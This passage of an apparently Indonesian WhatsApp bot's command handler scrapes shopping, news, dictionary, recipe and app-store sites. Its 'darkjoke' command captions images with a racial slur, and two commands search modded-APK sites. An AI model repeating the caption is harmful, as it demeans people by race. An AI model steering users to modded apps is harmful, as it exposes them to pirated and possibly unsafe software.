                    $('div.breadcrumb-new > ul > li:nth-child(5)').each(function (c, d) {
                        result.audio = $(d).find('a').attr('href').replace('surah', 'audioframe');
                    });

                    $('div.ayat-arab').each(function (a, b) {
                        ar.push($(b).text());
                    });

                    $('li > div.ayat-text').each(function (e, f) {
                        id.push($(f).text().replace(',', '').trim());
                    });

                    $('div.ayat-latin').each(function (g, h) {
                        lt.push($(h).text().trim());
                    });

                    for (let i = 0; i < ar.length; i++) {
                        result.push({
                            arab: ar[i],
                            indo: id[i],
                            latin: lt[i],
                        });
                    }

                    resolve(result);
                })
                .catch(reject);
        });
    }

    if (!text) return m.reply('```Masukan nomor surah\ncontoh : .surah 1```');
    m.reply('wait a minute...');
    let results = await surah(text);
    if (results.length > 0) {
        let message = '';
        results.forEach((result) => {
            message += `${result.arab}\n${result.latin}\n${result.indo}\n\n`;
        });
        m.reply(message);
    } else {
        m.reply('Nomor surah yang anda berikan tidak ada.');
    }
}
break;

case 'bukalapak': {
    async function BukaLapak(search) {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get(`https://www.bukalapak.com/products?from=omnisearch&from_keyword_history=false&search[keywords]=${search}&search_source=omnisearch_keyword&source=navbar`, {
                    headers: {
                        "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0'
                    }
                });
                const $ = cheerio.load(data);
                const dat = [];
                $('div.bl-flex-item.mb-8').each((i, u) => {
                    const a = $(u).find('observer-tracker > div > div');
                    const img = $(a).find('div > a > img').attr('src');
                    if (typeof img === 'undefined') return;

                    const link = $(a).find('.bl-thumbnail--slider > div > a').attr('href');
                    const title = $(a).find('.bl-product-card__description-name > p > a').text().trim();
                    const harga = $(a).find('div.bl-product-card__description-price > p').text().trim();
                    const rating = $(a).find('div.bl-product-card__description-rating > p').text().trim();
                    const terjual = $(a).find('div.bl-product-card__description-rating-and-sold > p').text().trim();

                    const dari = $(a).find('div.bl-product-card__description-store > span:nth-child(1)').text().trim();
                    const seller = $(a).find('div.bl-product-card__description-store > span > a').text().trim();
                    const link_sel = $(a).find('div.bl-product-card__description-store > span > a').attr('href');

                    const res_ = {
                        title: title,
                        rating: rating ? rating : 'No rating yet',
                        terjual: terjual ? terjual : 'Not yet bought',
                        harga: harga,
                        image: img,
                        link: link,
                        store: {
                            lokasi: dari,
                            nama: seller,
                            link: link_sel
                        }
                    };

                    dat.push(res_);
                });

                if (dat.every(x => x === undefined)) return resolve({ developer: '@sensei', mess: 'no result found' });
                resolve(dat);
            } catch (err) {
                console.error(err);
            }
        });
    }

    if (!text) return m.reply('```Masukan nama item yang ingin dicari!!\n```');
    m.reply('wait a minute...');
    let results = await BukaLapak(text);
    if (results.length > 0) {
        let message = `Hasil pencarian untuk *${text}*\n\n`;
        results.forEach((result) => {
            message += `${result.title}\n- Harga : ${result.harga}\n- Rating : ${result.rating}\n- Store : ${result.store.nama}\n- Lokasi : ${result.store.lokasi}\n- Terjual : ${result.terjual}\n- Link : ${result.link}\n\n`;
        });
        lilychan.sendMessage(m.chat, { image: { url: results[0].image }, caption: message }, { quoted: m });
    } else {
        m.reply('Nomor surah yang anda berikan tidak ada.');
    }
}
break;
case 'pgmall-malay': {
    if (!q) return m.reply(`_nak cari barang ape_`);
    
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function kyzh(query, m) {
        try {
            const { data } = await axios.get(`https://pgmall.my/search?search=${encodeURIComponent(query)}`);
            const $ = cheerio.load(data);
            const laptops = [];

            $('.product-img-wrapper').each((index, element) => {
                const productUrl = $(element).attr('href');
                const imgElement = $(element).find('img');
                const imgUrl = imgElement.data('src') || imgElement.attr('src');

                const productName = $(element)
                    .parent()
                    .next()
                    .find('.p-name p')
                    .text()
                    .trim();

                const productPrice = $(element)
                    .parent()
                    .next()
                    .find('.p-price-red span')
                    .text()
                    .trim();

                laptops.push({
                    name: productName || 'Nama tidak tersedia',
                    price: productPrice || 'Harga tidak tersedia',
                    imageUrl: imgUrl,
                    productUrl: productUrl || 'URL tidak tersedia'
                });
            });

            let result = `Hasil pencarian untuk "${query}":\n\n`;
            laptops.forEach((laptop, index) => {
                result += `${index + 1}. Nama: ${laptop.name}\n`;
                result += ` Harga: ${laptop.price}\n`;
                result += ` URL: ${laptop.productUrl}\n`;
                result += ` Gambar: ${laptop.imageUrl}\n\n`;
            });

            m.reply(result);
        } catch (error) {
            m.reply('Terjadi kesalahan saat mengambil data.');
        }
    }

    kyzh(`${encodeURIComponent(text)}`, m);
}
break;

case 'jadwaltv': {
    async function JadwalTV(query) {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get('https://www.jadwaltv.net/channel/' + query);
                const $ = cheerio.load(data);
                const tv = [];

                $('table.table.table-bordered > tbody > tr.jklIv').each((u, i) => {
                    let an = $(i).text().split('WIB');
                    tv.push(`${an[0]} - ${an[1]}`);
                });

                if (tv.every(x => x === undefined)) return resolve({ developer: '@xorizn', mess: 'no result found' });
                resolve(tv.join('\n'));
            } catch (err) {
                console.error(err);
            }
        });
    }

    if (!text) return m.reply('```Masukan Chanel TV\ncontoh : .jadwaltv ANTV```');
    m.reply('wait a minute...');
    let results = await JadwalTV(text);
    let ngawi = `${results}`;
    m.reply(ngawi);
}
break;
case 'darkjoke':
case 'darkjokes': {
    const bo = require('dhn-api');
    const res = await bo.Darkjokes();
    m.reply(mess.wait);
    lilychan.sendMessage(m.chat, { 
        image: { url: res }, 
        caption: `Dark banget kayak Negro` 
    }, { quoted: m });
}
break;

case 'meme': {
    let res = await fetch('https://raw.githubusercontent.com/HasamiAini/wabot_takagisan/main/whatsapp%20bot%20takagisan/whatsapp%20bot%20takagisan/lib/memeindo.json');
    let json = await res.json();
    let url = json[Math.floor(Math.random() * json.length)];
    m.reply(mess.wait);
    await lilychan.sendMessage(m.chat, { 
        image: { url: url.image }, 
        caption: 'Sangat Cringe Kek Kehidupan Kamu' 
    }, { quoted: m });
}
break;

case 'meme2': {
    let res = await fetch('https://candaan-api-h590oa540-ardhptr21.vercel.app/api/image/random');
    let json = await res.json();
    lilychan.sendMessage(m.chat, { 
        image: { url: json.data.url }, 
        caption: 'Cringe Ga Sih?' 
    }, { quoted: m });
}
break;

case 'chord': {
    async function chord(query) {
        return new Promise(async (resolve, reject) => {
            try {
                const head = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
                    "Cookie": "__gads=ID=4513c7600f23e1b2-22b06ccbebcc00d1:T=1635371139:RT=1635371139:S=ALNI_MYShBeii6AFkeysWDKiD3RyJ1106Q; _ga=GA1.2.409783375.1635371138; _gid=GA1.2.1157186793.1635371140; _fbp=fb.1.1635371147163.1785445876"
                };

                const { data } = await axios.get(`http://app.chordindonesia.com/?json=get_search_results&exclude=date,modified,attachments,comment_count,comment_status,thumbnail,thumbnail_images,author,excerpt,content,categories,tags,comments,custom_fields&search=${query}`, { headers: head });
                
                const anu = await axios.get(`http://app.chordindonesia.com/?json=get_post&id=${data.posts[0].id}`, { headers: head });
                
                let $ = cheerio.load(anu.data.post.content);
                
                resolve({
                    title: $("img").attr("alt"),
                    chord: $("pre").text().trim()
                });
            } catch (error) {
                reject(error);
            }
        });
    }

    if (!text) return m.reply('Input Judul Lagu');
    
    let query = text.replace(/\s/g, '+'); // Mengganti spasi dengan "+"
    let a = await chord(query);
    
    m.reply(`*Song :* ${a.title}\n*Chord :*\n\n${a.chord}`);
}
break;
case 'merriam': {
    if (!text) return m.reply('contoh nya : merriam house');
    const axios = require('axios');
    const cheerio = require('cheerio');

    const url = `https://www.merriam-webster.com/dictionary/${encodeURIComponent(text)}`;

    try {
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);
        let definitions = [];

        $('.dtText').each((i, elem) => {
            definitions.push($(elem).text().trim());
        });

        if (definitions.length === 0) {
            return m.reply('Kata tidak ditemukan dalam Merriam.');
        }

        let result = `Makna dari *${text}*:\n`;
        definitions.forEach((def, index) => {
            result += `${index + 1}. ${def}\n`;
        });

        lilychan.sendMessage(m.chat, { text: result }, { quoted: m });
    } catch (error) {
        m.reply('Terjadi kesalahan.');
    }
}
break
case 'resep':
  if (!text) return m.reply('Mohon masukkan nama makanan yang ingin Anda cari resepnya.\n\nContoh: resep Spaghetti')
  m.reply('Mencari resep...');
  try {
    const url = `https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`;
    const response = await axios.get(url);
    const data = response.data.meals[0];

    if (!data) {
      throw new Error('Tidak ada resep yang ditemukan untuk makanan tersebut.');
    }

    let ingredients = [];
    for (let i = 1; i <= 20; i++) {
      if (data[`strIngredient${i}`]) {
        ingredients.push(`${data[`strIngredient${i}`]} - ${data[`strMeasure${i}`]}`);
      }
    }

    const resep = `
Nama: ${data.strMeal}
Kategori: ${data.strCategory}
Asal: ${data.strArea}

Bahan-bahan:
${ingredients.join('\n')}

Instruksi:
${data.strInstructions}
    `;

    m.reply(resep);
  } catch (error) {
    m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
  }
  break
 case 'detik': {
  m.reply('Mencari berita terkini...');

  try {
    const url = 'https://www.detik.com/terpopuler';
    const response = await axios.get(url);
    const $ = cheerio.load(response.data);

    let berita = [];
    $('.grid-row article').each((index, element) => {
      if (index < 5) {  // Ambil 5 berita teratas
        const judul = $(element).find('h3.media__title').text().trim();
        const link = $(element).find('a').attr('href');
        const waktu = $(element).find('.media__date').text().trim();
        berita.push({ judul, link, waktu });
      }
    });

    if (berita.length === 0) {
      throw new Error('Tidak ada berita yang ditemukan.');
    }

    let beritaText = 'Berita Terpopuler:\n\n';
    berita.forEach((item, index) => {
      beritaText += `${index + 1}. ${item.judul}\n`;
      beritaText += `   ${item.waktu}\n`;
      beritaText += `   ${item.link}\n\n`;
    });

    m.reply(beritaText);
  } catch (error) {
    m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
  }
}
break 
case 'kbbi-kemdikbud': {
    if (!text) return m.reply('contoh kbbi-kemdikbud')
    const axios = require('axios')
    const url = `https://kbbi.kemdikbud.go.id/entri/${encodeURIComponent(text)}`
    axios.get(url).then(response => {
        const cheerio = require('cheerio')
        const $ = cheerio.load(response.data)
        let definition = $('ol').first().text().trim()
        if (!definition) {
            return m.reply('Kata tidak ditemukan dalam KBBI.')
        }
        lilychan.sendMessage(m.chat, { text: `${definition}` }, { quoted: m })
    }).catch(error => {
        m.reply('Terjadi elol.')
    })
}
break
case 'wiktionary': {
    if (!text) return m.reply('Contoh WikTionary rumah') 
 m.reply('Mencari artikel Wiktionary...');
 try {
   const url = `https://id.m.wiktionary.org/wiki/${q}`;
   const response = await axios.get(url);
   const $ = cheerio.load(response.data);

   const judul = $('#firstHeading').text().trim();
   const konten = $('#mw-content-text > div.mw-parser-output').find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');

   if (!konten) {
     throw new Error('Tidak ada artikel.');
   }

   const artikel = `_${judul}_\n\n${konten}`;
   m.reply(artikel);
 } catch (error) {
   m.reply(`Maaf : ${error.message}`);
 }
 }
 break
 case 'themovie': {
    if (!text) return m.reply('Contoh themovie Horror') 

  m.reply('_sabar tuan sedang mencari film nya_');

  async function avzz(query) {
    const url = `https://www.themoviedb.org/search?query=${query}`;
    try {
      const response = await axios.get(url);
      const html = response.data;
      const $ = cheerio.load(html);
      const movies = [];

      $('.card').each((index, element) => {
        const title = $(element).find('.title a').text().trim();
        const link = `https://www.themoviedb.org${$(element).find('.title a').attr('href')}`;
        const synopsis = $(element).find('.overview').text().trim();
        movies.push({ title, link, synopsis });
      });

      return movies;
    } catch (error) {
      console.error('error di sini:', error);
      return [];
    }
  }

  try {
    const query = encodeURIComponent(text);
    const movies = await avzz(query);

    if (movies.length === 0) {
      throw new Error('Film tidak ditemukan.');
    }

    let result = '';
    movies.forEach((movie, index) => {
      result += `*${index + 1}. ${movie.title}*\nLink: ${movie.link}\nSinopsis: ${movie.synopsis}\n\n`;
    });

    m.reply(result);
  } catch (error) {
    m.reply(`terjadi kesalahan: ${error.message}`);
  }
}
break
case 'temposearch': {
    if (!q.trim()) return m.reply("Silakan masukkan kata kunci pencarian.");

    const axios = require('axios');
    const cheerio = require('cheerio');

    const basenya = `https://www.tempo.co/search?q=`;

    async function tempoSearch(keyword) {
        try {
            const { data: htmlRaw } = await axios.get(`${basenya}${encodeURIComponent(keyword)}&page=1`);
            const $ = cheerio.load(htmlRaw);

            const news = {
                judul: keyword,
                data: []
            };

            $('.card-box.ft240.margin-bottom-sm').each((i, el) => {
                news.data.push({
                    index: i + 1,
                    judul: $(el).find('article h2.title').text().trim(),
                    url: $(el).find('figure a').attr('href'),
                    gambar: $(el).find('figure img').attr('src'),
                    deskripsi: $(el).find('article p').text().trim()
                });
            });

            return news;
        } catch (error) {
            console.error("Error fetching data:", error.message);
            return { judul: keyword, data: [] };
        }
    }

    tempoSearch(q)
        .then(result => {
            if (result.data.length === 0) {
                m.reply('Tidak ada hasil ditemukan untuk pencarian Anda.');
            } else {
                let response = `Hasil pencarian berita Tempo untuk: ${result.judul}\n\n`;
                result.data.forEach(item => {
                    response += `${item.index}. ${item.judul}\nLink: ${item.url}\nDeskripsi: ${item.deskripsi}\nGambar: ${item.gambar}\n\n`;
                });
                m.reply(response);
            }
        })
        .catch(error => {
            console.error(`!: ${error.message}`);
            m.reply('aaaaaaaaaa eror.');
        });
}
break
 case 'malaymail': {
    m.reply('_Mencari berita terkini di Malay Mail_');

    try {
        const { data } = await axios.get('https://www.malaymail.com/');
        const $ = cheerio.load(data);

        const newsItems = [];
        $('.article-title a').each((index, element) => {
            const title = $(element).text().trim();
            const link = $(element).attr('href');
            newsItems.push({ title, link });
        });

        if (newsItems.length === 0) {
            throw new Error('Gada Berita Baru');
        }

        let beritaText = 'Berita Terkini dari Malay Mail:\n\n';
        newsItems.forEach((item, index) => {
            beritaText += `${index + 1}. ${item.title}\n`;
            beritaText += `Link: ${item.link}\n\n`;
        });

        m.reply(beritaText);
    } catch (error) {
        m.reply(`${error.message}`);
    }
}
break;
case 'liputan6': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function avzz() {
        try {
                  
            const AvoskyBaik = await axios.get('https://www.liputan6.com/');
            const $ = cheerio.load(AvoskyBaik.data);

            const latestNews = $('.articles--iridescent-list').eq(2).find('article');

            const results = [];
            latestNews.each(function () {
                try {
                    const title = $(this).find('figure a').attr('title');
                    const link = $(this).find('figure a').attr('href');
                    const image = $(this).find('figure a picture img').attr('data-src');
                    const tag = $(this).find('aside header a').text();

                    results.push({ title, link, tag, image, source: 'liputan6' });
                } catch (e) {

                    console.error('Error scraping article:', e);
                }
            });

            return results;
        } catch (error) {
            console.error('Error fetching:', error);
            return [];
        }
    }

    avzz()
        .then(results => {
            if (results.length === 0) {
                m.reply('Tidak ada berita terbaru yang ditemukan.');
            } else {
                let message = 'Berita Terbaru dari Liputan6:\n\n';
                results.forEach((news, index) => {
                    message += `${index + 1}. ${news.title}\n`;
                    message += `Tag: ${news.tag}\n`;
                    message += `Link: ${news.link}\n`;
                    message += `Gambar: ${news.image}\n\n`;
                });
                m.reply(message);
            }
        })
        .catch(error => {
            console.error('ada bug:', error.message);
            m.reply('Terjadi kesalahan...');
        });
}
break
case 'kontan': {
    async function LilyKontanNews() {
        try {
            const res = await axios.request(`https://www.kontan.co.id/`, {
                method: "GET",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36"
                }
            });
            let hasil = [];
            const $ = cheerio.load(res.data);
            $("div.news-list > ul > li").each(function (a, b) {
                let berita = $(b).find("div.box-news.fleft > a > h1").text();
                let berita_url = $(b).find("a").attr("href");
                let berita_thumb = $(b).find("div.image-thumb").find("img").attr("data-src");
                let berita_jenis = $(b).find("a.link-orange").text();
                let berita_diupload = $(b).find("div.box-news.fleft").text().split(/[|]/g).splice(1).join("").slice(1);
                
                const result = {
                    berita,
                    berita_url,
                    berita_thumb,
                    berita_jenis,
                    berita_diupload
                };
                hasil.push(result);
            });
            var filter = hasil.filter(v => v.berita !== "" && v.berita_diupload !== undefined);
            return filter;
        } catch (e) {
            return e;
        }
    }

    let data = await LilyKontanNews();
    let lily = pickRandom(data);
    let cap = `   
> *Berita:* ${lily.berita}
> *Jenis:* ${lily.berita_jenis}
> *Upload:* ${lily.berita_diupload}
> *URL:* _${lily.berita_url}_
`.trim();
    await lilychan.sendFile(m.chat, lily.berita_thumb, null, cap, m);
}
break;

case 'inewstv': {
    async function iNewsTV() {
        try {
            const res = await axios.get(`https://www.inews.id/news`, {
                method: 'GET',
                headers: {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
                }
            });
            const hasil = [];
            const $ = cheerio.load(res.data);
            $('div.wdtop-row.more-news').each(function (a, b) {
                let berita = $(b).find('h2.wdtop-text').text().trim();
                let berita_diupload = $(b).find('span.wd-date').text().trim().slice(0, 35);
                let berita_jenis = $(b).find('span.wd-date > strong').text().trim();
                let berita_url = $(b).find('a').attr('href');
                let berita_thumb = $(b).find('div.lazy.wdtop-col-img').attr('data-src');
                
                const result = {
                    berita,
                    berita_url,
                    berita_diupload,
                    berita_jenis,
                    berita_thumb
                };
                hasil.push(result);
            });
            return hasil;
        } catch (e) {
            return e;
        }
    }

    let data = await iNewsTV();
    let lily = pickRandom(data);
    let cap = `   
> *Berita:* ${lily.berita}
> *Jenis:* ${lily.berita_jenis}
> *Upload:* ${lily.berita_diupload}
> *URL:* _${lily.berita_url}_
`.trim();
    await lilychan.sendFile(m.chat, lily.berita_thumb, null, cap, m);
}
break;
case 'indozone': {
    if (!q) return m.reply(`_cari berita apa_`);
    const axios = require('axios');
    const cheerio = require('cheerio');
    async function fadami(query, m) {
        const maxRetries = 3;
        let attempts = 0;
        while (attempts < maxRetries) {
            try {
                const { data } = await axios.get(`https://fadami.indozone.id/search?q=${encodeURIComponent(query)}`, {
                    timeout: 2000,
                });
                const $ = cheerio.load(data);
                const results = [];
                $('.latest__item').each((index, element) => {
                    const titleElement = $(element).find('.latest__title a');
                    const title = titleElement.text().trim();
                    const link = titleElement.attr('href');
                    const imgElement = $(element).find('.latest__img img');
                    const imgSrc = imgElement.data('src');
                    
                    if (title && link && imgSrc) {
                        results.push({ title, link: `${link}`, imgSrc });
                    }
                });
                if (results.length > 0) {
                    let message = 'Hasil pencarian:\n\n';
                    results.forEach((result, index) => {
                        message += `${index + 1}. ${result.title}\nLink: ${result.link}\nJpg: ${result.imgSrc}\n\n`;
                    });
                    m.reply(message);
                } else {
                    m.reply('Tidak Ada Hasil.');
                }
                return;
            } catch (error) {
                attempts++;
                if (attempts >= maxRetries) {
                    m.reply(`Error: ${error.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }
    fadami(q, m);
}
break
case 'ftg': {
    async function ftg(category) {
        const baseUrl = 'https://www.freetogame.com/api/games?category=';
        const validCategories = [
            'Sports', 'Social', 'Fighting', 'Fantasy', 'Sci-Fi', 
            'Racing', 'Card Games', 'MOBA', 'Anime', 
            'Battle Royale', 'MMORPG', 'Strategy', 'Shooter'
        ];

        if (!validCategories.includes(category)) {
            throw new Error('Kategori tidak valid. Pilih dari: ' + validCategories.join(', '));
        }

        try {
            const response = await axios.get(`${baseUrl}${category}`);
            return response.data; 
        } catch (error) {
            console.error('Terjadi kesalahan saat mengambil data:', error);
            throw error; 
        }
    }

    if (!text) return m.reply('```🚩 Masukan Category\n\nList Category\n- Sports\n- Social\n- Fighting\n- Fantasy\n- Sci-Fi\n- Racing\n- Card Games\n- MOBA\n- Anime\n- Battle Royale\n- MMORPG\n- Strategy\n- Shooter```');
    
    m.reply('wait a minute...');
    let results = await ftg(text);
    
    if (results.length > 0) {
        let message = 'Hasil pencarian:\n\n';
        results.forEach((result, index) => {
            message += `*[${index + 1}]*🎮\nGameName : ${result.title}\nID : ${result.rating}\nGenre: ${result.genre}\nPublisher : ${result.publisher}\nDeveloper : ${result.developer}\nRilis : ${result.release_date}\nDeskripsi : ${result.short_description}\nLink : ${result.game_url}\n\n`;
        });
        await lilychan.sendFile(m.chat, results[0].thumbnail, null, message, m);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break;

case 'playstore': {
    async function PlayStore(search) {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get(`https://play.google.com/store/search?q=${search}&c=apps`);
                const hasil = [];
                const $ = cheerio.load(data);
                
                $('.ULeU3b > .VfPpkd-WsjYwc.VfPpkd-WsjYwc-OWXEXe-INsAgc.KC1dQ.Usd1Ac.AaN0Dd.Y8RQXd > .VfPpkd-aGsRMb > .VfPpkd-EScbFb-JIbuQc.TAQqTe > a').each((i, u) => {
                    const linkk = $(u).attr('href');
                    const nama = $(u).find('.j2FCNc > .cXFu1 > .ubGTjb > .DdYX5').text();
                    const developer = $(u).find('.j2FCNc > .cXFu1 > .ubGTjb > .wMUdtb').text();
                    const img = $(u).find('.j2FCNc > img').attr('src');
                    const rate = $(u).find('.j2FCNc > .cXFu1 > .ubGTjb > div').attr('aria-label');
                    const rate2 = $(u).find('.j2FCNc > .cXFu1 > .ubGTjb > div > span.w2kbF').text();
                    const link = `https://play.google.com${linkk}`;

                    hasil.push({
                        link: link,
                        nama: nama ? nama : 'No name',
                        developer: developer ? developer : 'No Developer',
                        img: img ? img : 'https://i.ibb.co/G7CrCwN/404.png',
                        rate: rate ? rate : 'No Rate',
                        rate2: rate2 ? rate2 : 'No Rate',
                        link_dev: `https://play.google.com/store/apps/developer?id=${developer.split(" ").join('+')}`
                    });
                });
                
                if (hasil.every(x => x === undefined)) return resolve({ developer: '@xorizn', mess: 'no result found' });
                resolve(hasil);
            } catch (err) {
                console.error(err);
                reject(err);
            }
        });
    }

    if (!text) return m.reply('```🚩 Masukan Query```');
    
    m.reply('wait a minute...');
    let results = await PlayStore(text);
    
    if (results.length > 0) {
        let message = 'Hasil pencarian:\n\n';
        results.forEach((result, index) => {
            message += `*[ 🎮 ${index + 1} ]* GameName : ${result.nama}\nRating : ${result.rate}\nDeveloper: ${result.developer}\nLink : ${result.link}\n\n`;
        });
        m.reply(message);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break;
case 'happymod': {
    async function happymod(query) {
        try {
            const baseUrl = 'https://www.happymod.com/';
            const res = await axios.get(baseUrl + 'search.html?q=' + query);
            const $ = cheerio.load(res.data);
            const hasil = [];
            $("div.pdt-app-box").each((c, d) => {
                const title = $(d).find("a").text().trim();
                const icon = $(d).find("img.lazy").attr('data-original');
                const rating = $(d).find("span").text();
                const link = baseUrl + $(d).find("a").attr('href');
                hasil.push({
                    title,
                    icon,
                    link,
                    rating
                });
            });
            return hasil;
        } catch (error) {
            throw error;
        }
    }

    if (!text) return m.reply('```🚩 Input Query```');
    
    m.reply('wait a minute...');
    let results = await happymod(text);
    
    if (results.length > 0) {
        let message = 'Hasil pencarian:\n\n';
        results.forEach((result, index) => {
            message += `${index + 1}. *${result.title}*\n- Rating: ${result.rating}\n- Link: ${result.link}\n\n`;
        });
        await lilychan.sendFile(m.chat, results[0].icon, null, message, m);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break;

case 'an1': {
    async function an1Mods(query) {
        return new Promise((resolve, reject) => {
            axios.get('https://an1.com/tags/MOD/?story=' + query + '&do=search&subaction=search')
                .then(({ data }) => {
                    const $ = cheerio.load(data);
                    const nama = [];
                    const link = [];
                    const rating = [];
                    const thumb = [];
                    const developer = [];
                    const format = [];

                    $('body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.name > a > span').each((a, b) => {
                        let nem = $(b).text();
                        nama.push(nem);
                    });

                    $('div > ul > li.current-rating').each((c, d) => {
                        let rat = $(d).text();
                        rating.push(rat);
                    });

                    $('body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.developer.xsmf.muted').each((e, f) => {
                        let dev = $(f).text();
                        developer.push(dev);
                    });

                    $('body > div.page > div > div > div.app_list > div > div > div.img > img').each((g, h) => {
                        thumb.push($(h).attr('src'));
                    });

                    $('body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.name > a').each((i, j) => {
                        link.push($(j).attr('href'));
                    });

                    for (let i = 0; i < link.length; i++) {
                        format.push({
                            title: nama[i],
                            developer: developer[i],
                            rating: rating[i],
                            gambar: thumb[i],
                            link: link[i]
                        });
                    }

                    const result = {
                        creator: '@sensei',
                        data: format
                    };
                    resolve(result);
                })
                .catch(reject);
        });
    }

    if (!text) return m.reply('```🚩 Input Query```');
    
    m.reply('wait a minute...');
    let hasile = await an1Mods(text);
    let results = hasile.data;

    if (results.length > 0) {
        let message = 'Hasil pencarian:\n\n';
        results.forEach((result, index) => {
            message += `${index + 1}. *${result.title}*\n- Developer: ${result.developer}\n- Rating: ${result.rating}\n- Link: ${result.link}\n\n`;
        });
        await lilychan.sendFile(m.chat, results[0].gambar, null, message, m);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break;
case 'kodepos': {
    async function KodePos(query) {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get('https://nomorkodepos.com/?s=' + query);
                const $ = cheerio.load(data);
                let _data = [];

                $('table.pure-table.pure-table-horizontal > tbody > tr').each((i, u) => {
                    let _doto = [];
                    $(u).find('td').each((l, p) => {
                        _doto.push($(p).text().trim());
                    });
                    _data.push({
                        province: _doto[0],
                        city: _doto[1],
                        subdistrict: _doto[2],
                        village: _doto[3],
                        postalcode: _doto[4]
                    });
                });
                resolve(_data);
            } catch (err) {
                console.error(err);
                reject(err);
            }
        });
    }

    if (!text) return m.reply('```🚩 Masukan nama kota```');
    
    m.reply('wait a minute...');
    let results = await KodePos(text);
    
    if (results.length > 0) {
        let message = 'Hasil pencarian:\n\n';
        results.forEach((result, index) => {
            message += `Provinsi : ${result.province}\nKota : ${result.city}\nKecamatan : ${result.subdistrict}\nDesa : ${result.village}\nKode Pos : ${result.postalcode}\n\n`;
        });
        m.reply(message);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break;
case 'metronews': {
  async function gugelnih() {
    try {
      const response = await axios.get('https://www.metrotvnews.com/news');
      const $ = cheerio.load(response.data);

      const judul = [];
      const desc = [];
      const link = [];
      const thumb = [];

      $('h3 > a').each((index, element) => {
        judul.push($(element).attr('title'));
        link.push('https://www.metrotvnews.com' + $(element).attr('href'));
      });

      $('p').each((index, element) => {
        desc.push($(element).text());
      });

      $('img').each((index, element) => {
        thumb.push($(element).attr('src').replace('w=300', 'w=720'));
      });

      const result = judul.map((judul, index) => ({
        judul,
        link: link[index],
        thumb: thumb[index],
        deskripsi: desc[index]
      }));

      let message = 'Berita Terkini dari MetroTV News:\n\n';
      result.forEach(item => {
        message += `Judul: ${item.judul}\n`;
        message += `Deskripsi: ${item.deskripsi}\n`;
        message += `Link: ${item.link}\n`;
        message += `Thumbnail: ${item.thumb}\n\n`;
      });

      m.reply(message);
    } catch (error) {
      console.error('Error:', error.message);
      m.reply('Maaf, Bang.');
    }
  }

  gugelnih();
}
break
case 'okezonenews': {
  async function okezonecik() {
    try {
      const titids = await axios.get('https://news.okezone.com/');
      const $ = cheerio.load(titids.data);

      const judul = [];
      const desc = [];
      const link = [];
      const thumb = [];

      $('h2 > a').each((index, element) => {
        const title = $(element).text().trim();
        const href = $(element).attr('href');
        if (title && href) {
          judul.push(title);
          link.push(href);
        }
      });

      $('p').each((index, element) => {
        const text = $(element).text().trim();
        if (text) {
          desc.push(text);
        }
      });

      $('img').each((index, element) => {
        const src = $(element).attr('src');
        if (src) {
          thumb.push(src.replace('w=300', 'w=720'));
        }
      });

      const result = judul.map((judul, index) => ({
        judul,
        link: link[index],
        thumb: thumb[index],
        deskripsi: desc[index]
      }));

      let message = 'Berita Terkini dari Okezone News:\n\n';
      result.forEach(item => {
        message += `Judul: ${item.judul}\n`;
        message += `Deskripsi: ${item.deskripsi}\n`;
        message += `Link: ${item.link}\n`;
        message += `Thumbnail: ${item.thumb}\n\n`;
      });

      m.reply(message);
    } catch (error) {
      console.error('Error:', error.message);
      m.reply('erorrrrrrrrrr.');
    }
  }

  okezonecik();
}
break
  case 'globalnews': {
  async function gugelnih() {
    try {
      const response = await axios.get('https://api.gdeltproject.org/api/v2/doc/doc?query=latest&mode=artlist&format=json');
      const articles = response.data.articles;

      let message = 'Berita Global Terkini:\n\n';
      articles.slice(0, 5).forEach(article => { 
        message += `Judul: ${article.title}\n`;
        message += `Deskripsi: ${article.seendate || 'Tidak ada deskripsi.'}\n`;
        message += `Link: ${article.url}\n\n`;
      });

      m.reply(message);
    } catch (error) {
      console.error('Error:', error.message);
      m.reply('Maaf.');
    }
  }

  gugelnih();
}
break 
   case 'thestar': {
  async function theStarAvos() {
    try {
      const response = await axios.get('https://www.thestar.com.my/');
      const $ = cheerio.load(response.data);

      const judul = [];
      const desc = [];
      const link = [];
      const thumb = [];

      $('h2 > a').each((index, element) => {
        const title = $(element).text().trim();
        const href = $(element).attr('href');
        if (title && href) {
          judul.push(title);
          link.push(href);
        }
      });

      $('p').each((index, element) => {
        const text = $(element).text().trim();
        if (text) {
          desc.push(text);
        }
      });

      $('img').each((index, element) => {
        const src = $(element).attr('src');
        if (src) {
          thumb.push(src.replace('w=300', 'w=720'));
        }
      });

      const result = judul.map((judul, index) => ({
        judul,
        link: link[index],
        thumb: thumb[index],
        deskripsi: desc[index] || 'Deskripsi tidak tersedia.'
      }));

      let message = 'Berita Terkini dari The Star:\n\n';
      result.forEach(item => {
        message += `Judul: ${item.judul}\n`;
